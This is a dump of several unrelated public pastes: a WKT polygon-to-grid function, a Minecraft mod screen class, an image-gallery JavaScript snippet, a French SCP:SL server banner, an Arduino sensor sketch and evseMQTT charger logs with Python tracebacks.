        for interior in inputPOLYGON.interiors:
            int_x_grid, int_y_grid = process_boundary(interior)
            int_coordinates = list(zip(int_x_grid, int_y_grid))
            
            if int_coordinates[0] != int_coordinates[-1]:
                int_x_grid = np.append(int_x_grid, int_x_grid[0])
                int_y_grid = np.append(int_y_grid, int_y_grid[0])
                
            rings_wkt += "", ("" + "", "".join(f""{x} {y}"" for x, y in zip(int_x_grid, int_y_grid)) + "")""
        
        rings_wkt += "")""
        return rings_wkt

def geoPOLYGON_to_gridPOLYGON(inputREGION, min_lon, max_lat, resolution_lon, resolution_lat):
    global xmin, ymax, x_scale, y_scale
    xmin = min_lon
    ymax = max_lat
    x_scale = resolution_lon
    y_scale = resolution_lat
    
    try:
        inputREGION = wkt.loads(inputREGION)
        
        if inputREGION.geom_type == 'Polygon':
            return processPOLYGON(inputREGION)
        
        elif inputREGION.geom_type == 'MultiPolygon':
            polygon_wkts = []
            
            for polygon in inputREGION.geoms:
                grid_polygon = processPOLYGON(polygon)
                if grid_polygon:
                    polygon_wkts.append(grid_polygon)
            
            if not polygon_wkts:
                return None
                
            try:
                grid_polygons = [wkt.loads(poly_wkt) for poly_wkt in polygon_wkts if poly_wkt]
                merged = unary_union(grid_polygons)
                return merged.wkt
            except Exception as e:
                return f""MULTIPOLYGON({','.join([p.replace('POLYGON', '') for p in polygon_wkts])})""
        
        else:
            raise ValueError(f""Unsupported geometry type: {inputREGION.geom_type}"")
    except Exception as e:
        return f""Error: {str(e)}""

gridPOLY = geoPOLYGON_to_gridPOLYGON(geoPOLY, min_lon, max_lat, resolution_lon, resolution_lat)
return gridPOLY
$BODY$;"
gsjEUBH4,testing,just_kiding,JSON,Sunday 23rd of March 2025 10:26:17 AM CDT,"{
    ""name"" : ""sachin"",
    ""data"" : {
        ""age"" : 26,
        ""gender"" : ""MALE""
    }
}"
3aBac9iB,BaseCobbleMakerScreen,CreativeMasterBonin,Java,Sunday 23rd of March 2025 10:18:11 AM CDT,"package net.bcm.cmatd.gui;

import net.bcm.cmatd.Utility;
import net.bcm.cmatd.blockentity.BaseEnergyMakerBE;
import net.minecraft.client.gui.GuiGraphics;
import net.minecraft.client.gui.screens.inventory.AbstractContainerScreen;
import net.minecraft.network.chat.Component;
import net.minecraft.resources.ResourceLocation;
import net.minecraft.world.entity.player.Inventory;

import java.util.List;

public class BaseCobbleMakerScreen extends AbstractContainerScreen<BaseCobbleMakerMenu> {
    private static final ResourceLocation BG = ResourceLocation.parse(""cmatd:textures/gui/cobble_generator.png"");
    private static final int ENERGY_LEFT = 8;
    private static final int ENERGY_WIDTH = 126;
    private static final int ENERGY_TOP = 59;
    private static final int ENERGY_HEIGHT = 5;

    public BaseCobbleMakerScreen(BaseCobbleMakerMenu menu, Inventory playerInventory, Component title) {
        super(menu, playerInventory, title);
        this.inventoryLabelY = this.imageHeight - 110;
    }

    @Override
    protected void renderBg(GuiGraphics guiGraphics, float partialTick, int mouseX, int mouseY) {
        guiGraphics.blit(BG, leftPos, topPos, 0, 0, this.imageWidth, this.imageHeight);
        int power = menu.getEnergy();
        int p = (int) ((power / (float) BaseEnergyMakerBE.CAPACITY) * ENERGY_WIDTH);
        guiGraphics.fillGradient(leftPos + ENERGY_LEFT, topPos + ENERGY_TOP, leftPos + ENERGY_LEFT + p, topPos + ENERGY_TOP + ENERGY_HEIGHT, Utility.BRIGHT_LIGHT_BLUE, Utility.DARKER_BLUE);
        guiGraphics.fill(leftPos + ENERGY_LEFT + p, topPos + ENERGY_TOP, leftPos + ENERGY_LEFT + ENERGY_WIDTH, topPos + ENERGY_TOP + ENERGY_HEIGHT, Utility.DARKEST_GRAYER_BLUE);
    }

    @Override
    public void render(GuiGraphics guiGraphics, int mouseX, int mouseY, float partialTick) {
        super.render(guiGraphics, mouseX, mouseY, partialTick);
        // Render tooltip with power if in the energy box
        if (mouseX >= leftPos + ENERGY_LEFT && mouseX < leftPos + ENERGY_LEFT + ENERGY_WIDTH && mouseY >= topPos + ENERGY_TOP && mouseY < topPos + ENERGY_TOP + ENERGY_HEIGHT) {
            int power = menu.getEnergy();
            List<Component> components = List.of(
                    Component.translatable(""title.energy_fe_with_max"",power,menu.getBlockEntity().getMaxEnergy())
            );
            guiGraphics.renderComponentTooltip(this.font,components,mouseX,mouseY);
        }
        else{
            this.renderTooltip(guiGraphics, mouseX, mouseY);
        }
    }
}
"
Z5QvFMtp,Untitled,poshtarboba,JavaScript,Sunday 23rd of March 2025 10:08:34 AM CDT,"const src = []
document.querySelectorAll('.theItem').forEach(div => {
	src.push(div.querySelector('img').src.replace('/thumbs', '').replace('.png', '.jpg'))
})
document.head.innerHTML = '<meta charset=""UTF-8""><title>Model Whorie</title><style>img { margin: 0 4px 4px 0; height: 200px; border: 1px solid silver; min-width: 16px; min-height: 16px; }</style>'
document.body.innerHTML = src.map(e => '<img src=""' + e + '"" alt="""">').join('')"
VfT7s705,Untitled,BleuXz360,C#,Sunday 23rd of March 2025 09:28:38 AM CDT,"<style=""Title""><align=center><size=22><b><color=#040027>I</color><color=#04002B>n</color><color=#04002F>t</color><color=#040033>o</color> <color=#04003B>T</color><color=#04003F>h</color><color=#040043>e</color> <color=#04004B>V</color><color=#04004F>o</color><color=#040053>i</color><color=#040057>d</color></b></size></align></style>
 


<align=center><size=12><color=#adadad>═════════════════════════</color></size></align>



<size=10><align=""center""><link=""https://discord.gg/4SJxQKcwcE""><mark=#4653e0>||</mark><mark=#5865F2><b>|     ＤＩＳＣＯＲＤ     |</b></mark><mark=#4653e0>||</mark></link>     <link=""https://sites.google.com/view/scp-into-the-void/règlement""><mark=#eb313c>||</mark><mark=#FF424D><b>|        ＲＥＧＬＥＳ     |</b></mark><mark=#eb313c>||</mark></link></align></size>
<size=8><align=""center"">  <link=""https://discord.gg/4PCSUbrth5""><mark=#212121><b>|        ᴄʟɪᴄᴋ ᴛᴏ ᴊᴏɪɴ       |</b></mark></link>                   <link=""https://sites.google.com/view/scp-into-the-void/règlement""><mark=#212121><b>|      ᴄʟɪᴄᴋ ᴛᴏ ᴏᴘᴇɴ      |</b></mark></link></align></size>
 

<size=68%><align=""center""><color=#00B6F0><b>Bienvenue chez nous passer un bon moment chez nous !.</color></b></align></align></size>



 <align=""center""><size=68%><color=#7289d9><b>Serveur <color=blue>fra</color><color=#FFFFFF>nç</color><color=red>ais</color> <u>Seulement</u> sur ce serveur </b>🥥</size></align></color>



<align=center><size=12><color=#adadad>═════════════════════════</color></size></align>
 


<size=11><align=center><b>One Zero est un serveur SCP : SL RP qui offre une nouvelle expérience de jeux pour la communauté française ! le serveur propose une custom map pour lui seul , ce serveur possède pour lui le conseil Départementale par exemple où les membres de la main du serpent dans des moments aléatoires, sur ce serveur nous reprenons les bases du <color=#000000>Dark RP</color></align></size>
 

<align=center><size=12><color=#adadad>═════════════════════════</color></size></align>



<size=12><align=center><color=#fc8d4b>plus d'infomation sur le site web ⬇️</color></align></size>

<size=12><align=center><b><i><link=""https://sites.google.com/view/scp-into-the-void/"">Into the VOID ?</link></size></b></i></align>
<size=10><align=center><b>(Cliquable)</size></b></align>

<size=61%><align=""center"">Merci à NexTale et Faceless pour la contribution du serveur
Statut : BETA, développement 
Fondateur : vxid </align></size>


"
wN3uFhx5,sensors.ino,DrAungWinHtut,Arduino,Sunday 23rd of March 2025 09:21:55 AM CDT,"#include<Servo.h>

Servo myservo;
int count = 0;
void setup()
{
  myservo.attach(5);
  Serial.begin(9600);
  pinMode(A2,INPUT);
  pinMode(A3,INPUT);
  pinMode(A4,INPUT);
  pinMode(A5,INPUT);
  pinMode(3,INPUT);
  pinMode(7,INPUT);
  pinMode(2,OUTPUT);
  
  pinMode(2,OUTPUT);
  pinMode(4,OUTPUT);
  
}

void loop()
{
  int status =  digitalRead(3);
  int light = analogRead(A5);
  int temp = analogRead(A4);
  int soil = analogRead(A3);
  int pot = analogRead(A2);
  
  int degree = map(pot,0,1023,0,180);
  myservo.write(degree);
  
  digitalWrite(2,LOW);
  delayMicroseconds(2);
  digitalWrite(2,HIGH);
  delayMicroseconds(10);
  digitalWrite(2,LOW);
  int time = pulseIn(7,HIGH);
  float distance = time/29/2;
  Serial.print(""Distance = "");
  Serial.println(distance);
  alert(distance);
  
  Serial.print(""Light = ""); Serial.println(light);
  Serial.print(""Temp = ""); Serial.println(temp);
  Serial.print(""Soil = ""); Serial.println(soil);
 
  if(status)
  {
    digitalWrite(2,HIGH);
    Serial.println(""LED ON"");
  }
  else{
    digitalWrite(2,LOW);
    Serial.println(""LED OFF"");
  }
  if(soil <80)
  {
    digitalWrite(4,HIGH);
  }
  else
  {
    digitalWrite(4,LOW);
  }
  
  delay(100);
  
}

void alert(int distance)
{
  int t = distance/20;
    for (int i = 0; i < 50; i++) {  // Generate 50 pulses
      digitalWrite(8, HIGH);  // Turn ON buzzer
      delay(t);  // ON duration (5ms)
      digitalWrite(8, LOW);   // Turn OFF buzzer
      delay(t);  // OFF duration (5ms)
    }
  
}"
jh94uCDX,evseMQTT logs,moryoav,Bash,Sunday 23rd of March 2025 09:06:16 AM CDT,"Mar 23 16:03:12 carpi2 python[477]: 2025-03-23 16:03:12,509 - evseMQTT - INFO - Received command 10
Mar 23 16:03:12 carpi2 python[477]: 2025-03-23 16:03:12,511 - evseMQTT - INFO - Device sent a charge record
Mar 23 16:03:14 carpi2 python[477]: 2025-03-23 16:03:14,495 - evseMQTT - INFO - Received command 4
Mar 23 16:03:14 carpi2 python[477]: 2025-03-23 16:03:14,496 - evseMQTT - INFO - Device sent a single charge ac status
Mar 23 16:03:14 carpi2 python[477]: 2025-03-23 16:03:14,499 - evseMQTT - INFO - Message published: 30122
Mar 23 16:03:20 carpi2 python[477]: 2025-03-23 16:03:20,401 - evseMQTT - INFO - Received command 3
Mar 23 16:03:20 carpi2 python[477]: 2025-03-23 16:03:20,402 - evseMQTT - INFO - Device sent heartbeat - replying
Mar 23 16:03:20 carpi2 python[477]: 2025-03-23 16:03:20,403 - evseMQTT - INFO - Writing to characteristic 0000ffe9-0000-1000-8000-00805f9b34fb on 9C:A5:00:83:7E:72
Mar 23 16:03:20 carpi2 python[477]: 2025-03-23 16:03:20,437 - evseMQTT - INFO - Write complete
Mar 23 16:03:20 carpi2 python[477]: 2025-03-23 16:03:20,437 - evseMQTT - INFO - Writing to characteristic 0000ffe9-0000-1000-8000-00805f9b34fb on 9C:A5:00:83:7E:72
Mar 23 16:03:20 carpi2 python[477]: 2025-03-23 16:03:20,474 - evseMQTT - INFO - Write complete
Mar 23 16:03:20 carpi2 python[477]: 2025-03-23 16:03:20,516 - evseMQTT - INFO - Received command 10
Mar 23 16:03:20 carpi2 python[477]: 2025-03-23 16:03:20,517 - evseMQTT - INFO - Device sent a charge record
Mar 23 16:03:20 carpi2 python[477]: 2025-03-23 16:03:20,608 - evseMQTT - INFO - Received command 257
Mar 23 16:03:20 carpi2 python[477]: 2025-03-23 16:03:20,608 - evseMQTT - INFO - Device responded with 257, containing {'system_time': '2025-03-23T16:03:20', 'system_time_raw': 174273                           8600}
Mar 23 16:03:20 carpi2 python[477]: 2025-03-23 16:03:20,610 - evseMQTT - INFO - Message published: 30123
Mar 23 16:03:22 carpi2 python[477]: 2025-03-23 16:03:22,802 - evseMQTT - INFO - Received command 5
Mar 23 16:03:22 carpi2 python[477]: 2025-03-23 16:03:22,803 - evseMQTT - INFO - Device sent a charge status
Mar 23 16:03:24 carpi2 python[477]: 2025-03-23 16:03:24,583 - evseMQTT - INFO - Received command 4
Mar 23 16:03:24 carpi2 python[477]: 2025-03-23 16:03:24,584 - evseMQTT - INFO - Device sent a single charge ac status
Mar 23 16:03:24 carpi2 python[477]: 2025-03-23 16:03:24,586 - evseMQTT - INFO - Message published: 30124
Mar 23 16:03:27 carpi2 python[477]: 2025-03-23 16:03:27,510 - evseMQTT - INFO - Received command 10
Mar 23 16:03:27 carpi2 python[477]: 2025-03-23 16:03:27,511 - evseMQTT - INFO - Device sent a charge record
Mar 23 16:03:30 carpi2 python[477]: 2025-03-23 16:03:30,470 - evseMQTT - INFO - Received command 3
Mar 23 16:03:30 carpi2 python[477]: 2025-03-23 16:03:30,471 - evseMQTT - INFO - Device sent heartbeat - replying
Mar 23 16:03:30 carpi2 python[477]: 2025-03-23 16:03:30,472 - evseMQTT - INFO - Writing to characteristic 0000ffe9-0000-1000-8000-00805f9b34fb on 9C:A5:00:83:7E:72
Mar 23 16:03:30 carpi2 python[477]: 2025-03-23 16:03:30,506 - evseMQTT - INFO - Write complete
Mar 23 16:03:30 carpi2 python[477]: 2025-03-23 16:03:30,506 - evseMQTT - INFO - Writing to characteristic 0000ffe9-0000-1000-8000-00805f9b34fb on 9C:A5:00:83:7E:72
Mar 23 16:03:30 carpi2 python[477]: 2025-03-23 16:03:30,543 - evseMQTT - INFO - Write complete
Mar 23 16:03:30 carpi2 python[477]: 2025-03-23 16:03:30,676 - evseMQTT - INFO - Received command 0
Mar 23 16:03:30 carpi2 python[477]: 2025-03-23 16:03:30,678 - evseMQTT - INFO - Received command 2864
Mar 23 16:03:34 carpi2 python[477]: 2025-03-23 16:03:34,689 - evseMQTT - INFO - Received command 4
Mar 23 16:03:34 carpi2 python[477]: 2025-03-23 16:03:34,691 - evseMQTT - INFO - Device sent a single charge ac status
Mar 23 16:03:34 carpi2 python[477]: 2025-03-23 16:03:34,693 - evseMQTT - INFO - Message published: 30125
Mar 23 16:03:35 carpi2 python[477]: 2025-03-23 16:03:35,516 - evseMQTT - INFO - Received command 10
Mar 23 16:03:35 carpi2 python[477]: 2025-03-23 16:03:35,517 - evseMQTT - INFO - Device sent a charge record
Mar 23 16:03:36 carpi2 python[477]: 2025-03-23 16:03:36,003 - evseMQTT - INFO - Received command 5
Mar 23 16:03:36 carpi2 python[477]: 2025-03-23 16:03:36,004 - evseMQTT - INFO - Device sent a charge status
Mar 23 16:03:40 carpi2 python[477]: 2025-03-23 16:03:40,577 - evseMQTT - INFO - Received command 3
Mar 23 16:03:40 carpi2 python[477]: 2025-03-23 16:03:40,577 - evseMQTT - INFO - Device sent heartbeat - replying
Mar 23 16:03:40 carpi2 python[477]: 2025-03-23 16:03:40,579 - evseMQTT - INFO - Writing to characteristic 0000ffe9-0000-1000-8000-00805f9b34fb on 9C:A5:00:83:7E:72
Mar 23 16:03:40 carpi2 python[477]: 2025-03-23 16:03:40,612 - evseMQTT - INFO - Write complete
Mar 23 16:03:40 carpi2 python[477]: 2025-03-23 16:03:40,613 - evseMQTT - INFO - Writing to characteristic 0000ffe9-0000-1000-8000-00805f9b34fb on 9C:A5:00:83:7E:72
Mar 23 16:03:40 carpi2 python[477]: 2025-03-23 16:03:40,649 - evseMQTT - INFO - Write complete
Mar 23 16:03:40 carpi2 python[477]: 2025-03-23 16:03:40,783 - evseMQTT - INFO - Received command 257
Mar 23 16:03:40 carpi2 python[477]: 2025-03-23 16:03:40,784 - evseMQTT - INFO - Device responded with 257, containing {'system_time': '2025-03-23T16:03:40', 'system_time_raw': 1742738620}
Mar 23 16:03:40 carpi2 python[477]: 2025-03-23 16:03:40,786 - evseMQTT - INFO - Message published: 30126
Mar 23 16:03:42 carpi2 python[477]: 2025-03-23 16:03:42,509 - evseMQTT - INFO - Received command 10
Mar 23 16:03:42 carpi2 python[477]: 2025-03-23 16:03:42,510 - asyncio - ERROR - Task exception was never retrieved
Mar 23 16:03:42 carpi2 python[477]: future: <Task finished name='Task-88036' coro=<BLEManager._handle_notification_wrapper() done, defined at /home/pi/evseMQTT/src/evseMQTT/ble_manager.py:97> exception=IndexError('index out of range')>
Mar 23 16:03:42 carpi2 python[477]: Traceback (most recent call last):
Mar 23 16:03:42 carpi2 python[477]:   File ""/home/pi/evseMQTT/src/evseMQTT/ble_manager.py"", line 99, in _handle_notification_wrapper
Mar 23 16:03:42 carpi2 python[477]:     await self.event_handler.handle_notification(sender, data)
Mar 23 16:03:42 carpi2 python[477]:   File ""/home/pi/evseMQTT/src/evseMQTT/event_handlers.py"", line 62, in handle_notification
Mar 23 16:03:42 carpi2 python[477]:     data = handler(parsed_data['data'], parsed_data['identifier'])
Mar 23 16:03:42 carpi2 python[477]:            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Mar 23 16:03:42 carpi2 python[477]:   File ""/home/pi/evseMQTT/src/evseMQTT/parsers.py"", line 73, in charge_record
Mar 23 16:03:42 carpi2 python[477]:     ""start_date"": Utils.bytes_to_int_little(data[64:68]),
Mar 23 16:03:42 carpi2 python[477]:                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Mar 23 16:03:42 carpi2 python[477]:   File ""/home/pi/evseMQTT/src/evseMQTT/utils.py"", line 112, in bytes_to_int_little
Mar 23 16:03:42 carpi2 python[477]:     return (bytes[3] & 0xFF) | ((bytes[0] & 0xFF) << 24) | ((bytes[1] & 0xFF) << 16) | ((bytes[2] & 0xFF) << 8)
Mar 23 16:03:42 carpi2 python[477]:             ~~~~~^^^
Mar 23 16:03:42 carpi2 python[477]: IndexError: index out of range
Mar 23 16:03:42 carpi2 python[477]: 2025-03-23 16:03:42,516 - evseMQTT - INFO - Received command 450
Mar 23 16:03:44 carpi2 python[477]: 2025-03-23 16:03:44,796 - evseMQTT - INFO - Received command 4
Mar 23 16:03:44 carpi2 python[477]: 2025-03-23 16:03:44,797 - evseMQTT - INFO - Device sent a single charge ac status
Mar 23 16:03:44 carpi2 python[477]: 2025-03-23 16:03:44,799 - evseMQTT - INFO - Message published: 30127
Mar 23 16:03:49 carpi2 python[477]: 2025-03-23 16:03:49,222 - evseMQTT - INFO - Received command 5
Mar 23 16:03:49 carpi2 python[477]: 2025-03-23 16:03:49,223 - evseMQTT - INFO - Device sent a charge status
Mar 23 16:03:49 carpi2 python[477]: 2025-03-23 16:03:49,616 - evseMQTT - INFO - Received command 10
Mar 23 16:03:49 carpi2 python[477]: 2025-03-23 16:03:49,617 - evseMQTT - INFO - Device sent a charge record
Mar 23 16:03:50 carpi2 python[477]: 2025-03-23 16:03:50,683 - evseMQTT - INFO - Received command 3
Mar 23 16:03:50 carpi2 python[477]: 2025-03-23 16:03:50,684 - evseMQTT - INFO - Device sent heartbeat - replying
Mar 23 16:03:50 carpi2 python[477]: 2025-03-23 16:03:50,685 - evseMQTT - INFO - Writing to characteristic 0000ffe9-0000-1000-8000-00805f9b34fb on 9C:A5:00:83:7E:72
Mar 23 16:03:50 carpi2 python[477]: 2025-03-23 16:03:50,719 - evseMQTT - INFO - Write complete
Mar 23 16:03:50 carpi2 python[477]: 2025-03-23 16:03:50,719 - evseMQTT - INFO - Writing to characteristic 0000ffe9-0000-1000-8000-00805f9b34fb on 9C:A5:00:83:7E:72
Mar 23 16:03:50 carpi2 python[477]: 2025-03-23 16:03:50,756 - evseMQTT - INFO - Write complete
Mar 23 16:03:50 carpi2 python[477]: 2025-03-23 16:03:50,889 - evseMQTT - INFO - Received command 257
Mar 23 16:03:50 carpi2 python[477]: 2025-03-23 16:03:50,890 - evseMQTT - INFO - Device responded with 257, containing {'system_time': '2025-03-23T16:03:50', 'system_time_raw': 1742738630}
Mar 23 16:03:50 carpi2 python[477]: 2025-03-23 16:03:50,892 - evseMQTT - INFO - Message published: 30128
Mar 23 16:03:54 carpi2 python[477]: 2025-03-23 16:03:54,883 - evseMQTT - INFO - Received command 4
Mar 23 16:03:54 carpi2 python[477]: 2025-03-23 16:03:54,885 - evseMQTT - INFO - Device sent a single charge ac status
Mar 23 16:03:54 carpi2 python[477]: 2025-03-23 16:03:54,887 - evseMQTT - INFO - Message published: 30129
Mar 23 16:03:56 carpi2 python[477]: 2025-03-23 16:03:56,610 - evseMQTT - INFO - Received command 10
Mar 23 16:03:56 carpi2 python[477]: 2025-03-23 16:03:56,611 - evseMQTT - INFO - Device sent a charge record
Mar 23 16:04:00 carpi2 python[477]: 2025-03-23 16:04:00,789 - evseMQTT - INFO - Received command 3
Mar 23 16:04:00 carpi2 python[477]: 2025-03-23 16:04:00,790 - evseMQTT - INFO - Device sent heartbeat - replying
Mar 23 16:04:00 carpi2 python[477]: 2025-03-23 16:04:00,792 - evseMQTT - INFO - Writing to characteristic 0000ffe9-0000-1000-8000-00805f9b34fb on 9C:A5:00:83:7E:72
Mar 23 16:04:00 carpi2 python[477]: 2025-03-23 16:04:00,825 - evseMQTT - INFO - Write complete
Mar 23 16:04:00 carpi2 python[477]: 2025-03-23 16:04:00,826 - evseMQTT - INFO - Writing to characteristic 0000ffe9-0000-1000-8000-00805f9b34fb on 9C:A5:00:83:7E:72
Mar 23 16:04:00 carpi2 python[477]: 2025-03-23 16:04:00,862 - evseMQTT - INFO - Write complete
Mar 23 16:04:00 carpi2 python[477]: 2025-03-23 16:04:00,977 - evseMQTT - INFO - Received command 257
Mar 23 16:04:00 carpi2 python[477]: 2025-03-23 16:04:00,978 - evseMQTT - INFO - Device responded with 257, containing {'system_time': '2025-03-23T16:04:00', 'system_time_raw': 1742738640}
Mar 23 16:04:00 carpi2 python[477]: 2025-03-23 16:04:00,980 - evseMQTT - INFO - Message published: 30130
Mar 23 16:04:02 carpi2 python[477]: 2025-03-23 16:04:02,422 - evseMQTT - INFO - Received command 5
Mar 23 16:04:02 carpi2 python[477]: 2025-03-23 16:04:02,423 - evseMQTT - INFO - Device sent a charge status
Mar 23 16:04:03 carpi2 python[477]: 2025-03-23 16:04:03,623 - evseMQTT - INFO - Received command 10
Mar 23 16:04:03 carpi2 python[477]: 2025-03-23 16:04:03,624 - evseMQTT - INFO - Device sent a charge record
Mar 23 16:04:04 carpi2 python[477]: 2025-03-23 16:04:04,990 - evseMQTT - INFO - Received command 4
Mar 23 16:04:04 carpi2 python[477]: 2025-03-23 16:04:04,991 - evseMQTT - INFO - Device sent a single charge ac status
Mar 23 16:04:04 carpi2 python[477]: 2025-03-23 16:04:04,993 - evseMQTT - INFO - Message published: 30131
Mar 23 16:04:10 carpi2 python[477]: 2025-03-23 16:04:10,616 - evseMQTT - INFO - Received command 10
Mar 23 16:04:10 carpi2 python[477]: 2025-03-23 16:04:10,617 - evseMQTT - INFO - Device sent a charge record
Mar 23 16:04:10 carpi2 python[477]: 2025-03-23 16:04:10,877 - evseMQTT - INFO - Received command 3
Mar 23 16:04:10 carpi2 python[477]: 2025-03-23 16:04:10,878 - evseMQTT - INFO - Device sent heartbeat - replying
Mar 23 16:04:10 carpi2 python[477]: 2025-03-23 16:04:10,879 - evseMQTT - INFO - Writing to characteristic 0000ffe9-0000-1000-8000-00805f9b34fb on 9C:A5:00:83:7E:72
Mar 23 16:04:10 carpi2 python[477]: 2025-03-23 16:04:10,912 - evseMQTT - INFO - Write complete
Mar 23 16:04:10 carpi2 python[477]: 2025-03-23 16:04:10,913 - evseMQTT - INFO - Writing to characteristic 0000ffe9-0000-1000-8000-00805f9b34fb on 9C:A5:00:83:7E:72
Mar 23 16:04:10 carpi2 python[477]: 2025-03-23 16:04:10,950 - evseMQTT - INFO - Write complete
Mar 23 16:04:11 carpi2 python[477]: 2025-03-23 16:04:11,102 - evseMQTT - INFO - Received command 257
Mar 23 16:04:11 carpi2 python[477]: 2025-03-23 16:04:11,103 - evseMQTT - INFO - Device responded with 257, containing {'system_time': '2025-03-23T16:04:10', 'system_time_raw': 1742738650}
Mar 23 16:04:11 carpi2 python[477]: 2025-03-23 16:04:11,105 - evseMQTT - INFO - Message published: 30132
Mar 23 16:04:15 carpi2 python[477]: 2025-03-23 16:04:15,096 - evseMQTT - INFO - Received command 4
Mar 23 16:04:15 carpi2 python[477]: 2025-03-23 16:04:15,097 - evseMQTT - INFO - Device sent a single charge ac status
Mar 23 16:04:15 carpi2 python[477]: 2025-03-23 16:04:15,099 - evseMQTT - INFO - Message published: 30133
Mar 23 16:04:15 carpi2 python[477]: 2025-03-23 16:04:15,602 - evseMQTT - INFO - Received command 5
Mar 23 16:04:15 carpi2 python[477]: 2025-03-23 16:04:15,604 - asyncio - ERROR - Task exception was never retrieved
Mar 23 16:04:15 carpi2 python[477]: future: <Task finished name='Task-88054' coro=<BLEManager._handle_notification_wrapper() done, defined at /home/pi/evseMQTT/src/evseMQTT/ble_manager.py:97> exception=IndexError('index out of range')>
Mar 23 16:04:15 carpi2 python[477]: Traceback (most recent call last):
Mar 23 16:04:15 carpi2 python[477]:   File ""/home/pi/evseMQTT/src/evseMQTT/ble_manager.py"", line 99, in _handle_notification_wrapper
Mar 23 16:04:15 carpi2 python[477]:     await self.event_handler.handle_notification(sender, data)
Mar 23 16:04:15 carpi2 python[477]:   File ""/home/pi/evseMQTT/src/evseMQTT/event_handlers.py"", line 62, in handle_notification
Mar 23 16:04:15 carpi2 python[477]:     data = handler(parsed_data['data'], parsed_data['identifier'])
Mar 23 16:04:15 carpi2 python[477]:            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Mar 23 16:04:15 carpi2 python[477]:   File ""/home/pi/evseMQTT/src/evseMQTT/parsers.py"", line 106, in charge_status
Mar 23 16:04:15 carpi2 python[477]:     ""fee_type"": Utils.byte_to_integer(data[71]),
Mar 23 16:04:15 carpi2 python[477]:                                       ~~~~^^^^
Mar 23 16:04:15 carpi2 python[477]: IndexError: index out of range
Mar 23 16:04:15 carpi2 python[477]: 2025-03-23 16:04:15,609 - evseMQTT - INFO - Received command 2
Mar 23 16:04:15 carpi2 python[477]: 2025-03-23 16:04:15,610 - asyncio - ERROR - Task exception was never retrieved
Mar 23 16:04:15 carpi2 python[477]: future: <Task finished name='Task-88055' coro=<BLEManager._handle_notification_wrapper() done, defined at /home/pi/evseMQTT/src/evseMQTT/ble_manager.py:97> exception=IndexError('index out of range')>
Mar 23 16:04:15 carpi2 python[477]: Traceback (most recent call last):
Mar 23 16:04:15 carpi2 python[477]:   File ""/home/pi/evseMQTT/src/evseMQTT/ble_manager.py"", line 99, in _handle_notification_wrapper
Mar 23 16:04:15 carpi2 python[477]:     await self.event_handler.handle_notification(sender, data)
Mar 23 16:04:15 carpi2 python[477]:   File ""/home/pi/evseMQTT/src/evseMQTT/event_handlers.py"", line 62, in handle_notification
Mar 23 16:04:15 carpi2 python[477]:     data = handler(parsed_data['data'], parsed_data['identifier'])
Mar 23 16:04:15 carpi2 python[477]:            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Mar 23 16:04:15 carpi2 python[477]:   File ""/home/pi/evseMQTT/src/evseMQTT/parsers.py"", line 22, in login_response
Mar 23 16:04:15 carpi2 python[477]:     ""type"": data[0],
Mar 23 16:04:15 carpi2 python[477]:             ~~~~^^^
Mar 23 16:04:15 carpi2 python[477]: IndexError: index out of range
Mar 23 16:04:18 carpi2 python[477]: 2025-03-23 16:04:18,623 - evseMQTT - INFO - Received command 10
Mar 23 16:04:18 carpi2 python[477]: 2025-03-23 16:04:18,624 - evseMQTT - INFO - Device sent a charge record
Mar 23 16:04:20 carpi2 python[477]: 2025-03-23 16:04:20,983 - evseMQTT - INFO - Received command 3
Mar 23 16:04:20 carpi2 python[477]: 2025-03-23 16:04:20,984 - evseMQTT - INFO - Device sent heartbeat - replying
Mar 23 16:04:20 carpi2 python[477]: 2025-03-23 16:04:20,985 - evseMQTT - INFO - Writing to characteristic 0000ffe9-0000-1000-8000-00805f9b34fb on 9C:A5:00:83:7E:72
Mar 23 16:04:21 carpi2 python[477]: 2025-03-23 16:04:21,019 - evseMQTT - INFO - Write complete
Mar 23 16:04:21 carpi2 python[477]: 2025-03-23 16:04:21,020 - evseMQTT - INFO - Writing to characteristic 0000ffe9-0000-1000-8000-00805f9b34fb on 9C:A5:00:83:7E:72
Mar 23 16:04:21 carpi2 python[477]: 2025-03-23 16:04:21,056 - evseMQTT - INFO - Write complete
Mar 23 16:04:21 carpi2 python[477]: 2025-03-23 16:04:21,190 - evseMQTT - INFO - Received command 257
Mar 23 16:04:21 carpi2 python[477]: 2025-03-23 16:04:21,191 - evseMQTT - INFO - Device responded with 257, containing {'system_time': '2025-03-23T16:04:20', 'system_time_raw': 1742738660}
Mar 23 16:04:21 carpi2 python[477]: 2025-03-23 16:04:21,192 - evseMQTT - INFO - Message published: 30134
Mar 23 16:04:25 carpi2 python[477]: 2025-03-23 16:04:25,202 - evseMQTT - INFO - Received command 4
Mar 23 16:04:25 carpi2 python[477]: 2025-03-23 16:04:25,204 - evseMQTT - INFO - Device sent a single charge ac status
Mar 23 16:04:25 carpi2 python[477]: 2025-03-23 16:04:25,206 - evseMQTT - INFO - Message published: 30135
Mar 23 16:04:25 carpi2 python[477]: 2025-03-23 16:04:25,617 - evseMQTT - INFO - Received command 10
Mar 23 16:04:25 carpi2 python[477]: 2025-03-23 16:04:25,618 - evseMQTT - INFO - Device sent a charge record
Mar 23 16:04:28 carpi2 python[477]: 2025-03-23 16:04:28,802 - evseMQTT - INFO - Received command 0
Mar 23 16:04:28 carpi2 python[477]: 2025-03-23 16:04:28,805 - evseMQTT - INFO - Received command 12595
Mar 23 16:04:31 carpi2 python[477]: 2025-03-23 16:04:31,090 - evseMQTT - INFO - Received command 3
Mar 23 16:04:31 carpi2 python[477]: 2025-03-23 16:04:31,090 - evseMQTT - INFO - Device sent heartbeat - replying
Mar 23 16:04:31 carpi2 python[477]: 2025-03-23 16:04:31,092 - evseMQTT - INFO - Writing to characteristic 0000ffe9-0000-1000-8000-00805f9b34fb on 9C:A5:00:83:7E:72
Mar 23 16:04:31 carpi2 python[477]: 2025-03-23 16:04:31,125 - evseMQTT - INFO - Write complete
Mar 23 16:04:31 carpi2 python[477]: 2025-03-23 16:04:31,126 - evseMQTT - INFO - Writing to characteristic 0000ffe9-0000-1000-8000-00805f9b34fb on 9C:A5:00:83:7E:72
